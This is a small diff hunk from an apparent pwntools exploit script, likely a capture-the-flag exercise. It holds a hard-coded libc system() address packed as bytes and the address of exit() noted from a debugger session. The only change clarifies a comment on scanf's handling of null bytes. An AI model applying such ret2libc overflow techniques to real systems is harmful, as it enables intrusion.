@@ -520,7 +520,8 @@ from pwn import *
 # 0x7ffff7e1f860
 system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
 # make sure the length fits the architecture!
-# null is no issue here because scanf() does not stop reading there.
+# null is no issue here because scanf()
+# with a "%s" format string does not stop reading there.
 
 # gef> p exit
 # 0x7ffff7e15100
